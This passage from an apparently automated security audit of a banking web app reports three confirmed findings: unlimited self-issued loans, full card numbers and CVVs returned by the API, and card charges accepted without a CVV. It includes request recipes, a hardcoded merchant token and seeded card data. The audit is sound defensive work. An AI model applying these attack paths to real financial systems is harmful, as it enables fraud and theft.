  "dynamic_test": "POST /api/accounts {\"account_type\":\"loan\",\"account_name\":\"x\",\"borrow_amount\":\"1000000.00\",\"disbursement_account_id\":<own transaction>}. Confirm the transaction account balance increased by 1,000,000 and a completed Loan proceeds disbursement row exists. Try 9999999999999.99 near the DECIMAL cap."
}
```

#### Validator reasoning

Authenticated POST /api/accounts with account_type=loan is a complete source-to-sink money-creation path. Any registered user (public /api/auth/register) can first open a transaction account, then open a loan whose borrow_amount is validated only as required|numeric|decimal:2 and > 0. Validator::validateDecimal uses /^\d+(\.\d{1,2})?$/ with no digit-length or max cap. AccountController::store then formats the attacker-chosen amount and immediately credits the caller-owned disbursement transaction account via Account::updateBalance while debiting the new loan account. There is no product maximum, credit check, KYC, approval queue, or rate limit. The UI input also has min=0.01 and no max. Resulting funds are spendable: own-account transfers only require sufficient transaction-account balance (which was just credited), and external transfers do not even check balance. The only practical ceiling is MySQL DECIMAL(15,2) (~9.99e12), which is not an authorization control. JWT, account_type allowlist, and “disbursement account must be the caller’s transaction account” do not bound the amount. The cited Account::create sink is slightly mis-attributed for loans (create inserts balance 0.00); the actual credit is updateBalance on the destination, which is in the same handler and is unconstrained.

#### Code evidence

```
if (isset($data['credit_limit']) && trim((string)$data['credit_limit']) !== '') {
                $limitErrors = Validator::make($data, [
                    'credit_limit' => 'numeric',
                ]);
                ...
                    $creditLimit = (float)$data['credit_limit'];
            ...
            $initialBalance = $creditLimit;
        ...
            } elseif ((float)$data['borrow_amount'] <= 0) {
                $errors['borrow_amount'][] = 'The borrow_amount field must be greater than 0.';
            }
        ...
            $accountId = Account::create([
                ...
                'balance'        => $initialBalance,
                ...
                'credit_limit'   => $creditLimit,
            ]);

            if ($data['account_type'] === 'loan') {
                $borrowAmount = number_format((float)$data['borrow_amount'], 2, '.', '');

                Account::updateBalance($accountId, '-' . $borrowAmount);
                Account::updateBalance((int)$destination['id'], $borrowAmount);
```

## 82. Full PAN and CVV stored in plaintext and returned by account APIs — Account::toPublic returns full card_number, card_expiry, and card_cvv to the cli

- Lead reference: ENCX-082
- Category: A02
- Severity: MEDIUM
- Confidence: 91%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Account.php:75
- Fingerprint: 9e4c16ffbfb364929c02e5af7246b27e9301aecfb8ac28d6855bf60d5745478e

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AccountController.php",
  "line": 54,
  "symbol": "store",
  "input": "generated card_number/card_expiry/card_cvv"
}
```

#### Controls encountered

```
[
  "GET /api/accounts and GET /api/accounts/{id} require Bearer JWT via AuthMiddleware",
  "findByUser / findByIdAndUser constrain rows to auth user_id (no IDOR on these endpoints)",
  "toPublic only attaches card_number/card_expiry/card_cvv when account_type === 'credit_card'",
  "Frontend account list masks PAN to last 4 (API still returns full PAN and CVV; detail view renders them in full)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Account.php",
  "line": 75,
  "symbol": "Account::create",
  "operation": "INSERT card_number, card_expiry, card_cvv plaintext"
}
```

#### Counterevidence

```
[
  "Displaying an issued virtual card (PAN, expiry, CVV) to the authenticated cardholder is the intended UX in public/banking/js/pages/accounts.js renderDetailHeader.",
  "No unauthenticated or cross-user read of another customer's cards via AccountController index/show.",
  "Charging a card on POST /api/payments/process additionally requires a merchant machine token (though the default token is present in config/app.php)."
]
```

#### Proof gaps

```
[
  "Third-party abuse of the returned SAD still needs a stolen/ XSS-exfiltrated JWT (or another session-theft primitive); that is a prerequisite, not a gap in the disclosure path itself."
]
```

#### Attack path

```
{
  "nodes": [
    "Credit-card PAN/expiry/CVV stored plaintext then loaded SELECT * on GET /api/accounts and GET /api/accounts/{id}",
    "Account::toPublic copies full card_number, card_expiry, card_cvv into the client JSON whenever account_type === 'credit_card'",
    "Response::success json_encodes with no truncation/masking; list UI masks last4 but the API still sends full SAD",
    "Stolen JWT/XSS reads the payload; POST /api/payments/process consumes those fields"
  ],
  "impact": "API-level disclosure of full PAN, expiry, and CVV to the client, violating PCI DSS display/storage rules and enabling CNP fraud after session theft.",
  "severity_reasoning": "Distinct root cause is toPublic serialization rather than the INSERT itself. Owner-scoped so medium, but CVV is returned unmasked even on the list endpoint.",
  "dynamic_test": "GET /api/accounts as a user with a credit_card. Assert JSON includes full card_number (not last4), card_expiry, and card_cvv. Confirm the list UI may mask last4 while the network response does not."
}
```

#### Validator reasoning

Confirmed. Account::toPublic is an explicit SAD serialization sink with a complete, live source-to-sink path and no masking/encryption at the API boundary.

Source: credit-card PANs, expiry, and CVV are persisted as plaintext VARCHAR columns (schema.sql:32-34; Account::create INSERT at Account.php:73-85). Values are either server-generated on POST /api/accounts (AccountController::store → AccountService::generateCreditCardNumber/Expiry/Cvv) or seeded in install/seed.sql (e.g. 4532015001345674 / 08/29 / 842).

Propagation: AccountController::index (GET /api/accounts), show (GET /api/accounts/{id}), and store (POST /api/accounts 201) all load rows via SELECT * (findByUser / findByIdAndUser / findById) and pass them through Account::toPublic.

Sink: Account.php:111-115 copies the full unmasked card_number, card_expiry, and card_cvv into the response array whenever account_type === 'credit_card'. Response::success json_encodes that payload with no truncation, hashing, or field-level encryption.

JWT + user_id scoping prevent IDOR (a caller only receives their own cards), but they do not block the claimed defect: SAD is placed in the client-visible JSON. The list endpoint over-discloses relative to the UI (accounts.js list uses only last4; the API still sends full PAN and CVV). JWT is stored in localStorage, so XSS or token theft yields immediately reusable CNP data. POST /api/payments/process consumes exactly these fields (PAN + expiry required; CVV compared in plaintext when supplied) under machine-token auth, and the default machine token is hardcoded in config/app.php. PCI DSS 3.2/3.3 forbids storing CVV after authorization and requires PAN masking on display; returning stored CVV proves both storage and transmission of SAD.

This is owner-scoped issuer-to-cardholder disclosure rather than unauthenticated leakage, which supports medium (not critical) severity, but the serialization bug itself is certain.

#### Code evidence

```
$stmt = $db->prepare(
            'INSERT INTO accounts (user_id, bsb, account_number, account_type, account_name, currency, balance, card_number, card_expiry, card_cvv, credit_limit) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
        );
        $stmt->execute([
            ...
            $data['card_number'] ?? null,
            $data['card_expiry'] ?? null,
            $data['card_cvv'] ?? null,
            ...
        ]);
        ...
        if ($account['account_type'] === 'credit_card') {
            $data['card_number']  = $account['card_number'] ?? null;
            $data['card_expiry']  = $account['card_expiry'] ?? null;
            $data['card_cvv']     = $account['card_cvv'] ?? null;
            $data['credit_limit'] = $account['credit_limit'] ?? '25000.00';
        }
```

## 83. Card payment API accepts charges without CVV — Payment process validator does not require cvv

- Lead reference: ENCX-083
- Category: A04
- Severity: HIGH
- Confidence: 95%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Models/Account.php:64
- Fingerprint: 6e4975d3443ee10da5e6e1aae0ae2800a1f7da1d1893ab59071e2fdd3c849a70

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/PaymentController.php",
  "line": 22,
  "symbol": "process",
  "input": "card_number, expiry, optional cvv"
}
```

#### Controls encountered

```
[
  "MachineAuthMiddleware Bearer token (hardcoded/seeded default mch_face_insurance_secret_key_2026 still accepted via DB hash and config fallback)",
  "Luhn check on PAN (passes for seeded and generated cards)",
  "Expiry format, not-expired, and stored-expiry match (seeded expiries and generateCreditCardExpiry() = today+3 years are known)",
  "Available-credit comparison before debit (seeded cards have 25000.00)"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Models/Account.php",
  "line": 64,
  "symbol": "Account::findByCardNumber",
  "operation": "SELECT * FROM accounts WHERE card_number = ?"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "POST /api/payments/process Validator::make requires merchant_id, card_number, expiry, amount only — cvv/cvc is not required",
    "Machine token default mch_face_insurance_secret_key_2026 authenticates the caller",
    "findByCardNumber then CVV block skipped because inputCvv is ''",
    "Seeded public PAN+expiry pass Luhn/expiry/credit checks; updateBalance moves funds to the merchant"
  ],
  "impact": "Charges succeed without CVV against any known card, including every seeded credit card, because the process validator never requires cvv.",
  "severity_reasoning": "Distinct root cause is the missing required cvv rule (the comparison is already conditional). Combined with the public machine token and seeded PANs this is a complete CNP fraud path. High.",
  "dynamic_test": "POST /api/payments/process with default machine Bearer, seeded PAN/expiry, amount, no cvv key at all. Confirm success. Send the same request with cvv:\"000\" and confirm PAYMENT_DECLINED, proving the check only runs when the field is present."
}
```

#### Validator reasoning

POST /api/payments/process is a live, machine-auth route whose request validator never requires cvv/cvc. After Luhn, expiry, and card lookup, CVV is compared only when both a stored card_cvv exists and the client sent a non-empty cvv/cvc. Omitting the field (or sending whitespace) skips the check and still debits the card via Account::updateBalance. That is a complete source-to-sink payment-fraud path: attacker-controlled JSON → Validator::make without cvv → conditional CVV gate → balance transfer.

The remaining controls do not block the skip. Machine auth is required, but the accepted token is the hardcoded default mch_face_insurance_secret_key_2026 (config fallback, seed SHA2 insert, and admin UI). Seeded PANs and expiries are public in install/seed.sql (e.g. 4532015001345674 / 08/29 with $25,000 available credit), and newly issued cards use a deterministic expiry of today+3 years. Merchant id faceinsurance is seeded. None of Luhn, expiry match, or available-credit checks substitute for cardholder CVV on a card-not-present charge.

#### Code evidence

```
$cardAccount = Account::findByCardNumber($cleanCard);
        ...
        // 5. Validate CVV/CVC if provided
        $inputCvv = trim($data['cvv'] ?? $data['cvc'] ?? '');
        if (!empty($cardAccount['card_cvv']) && $inputCvv !== '') {
            if ($inputCvv !== $cardAccount['card_cvv']) {
                Response::error('PAYMENT_DECLINED', 'Payment declined. Please check your card details and try again.', 400);
            }
        }
        ...
            Account::updateBalance((int)$cardAccount['id'], '-' . $amount);
            Account::updateBalance((int)$merchant['account_id'], $amount);
```
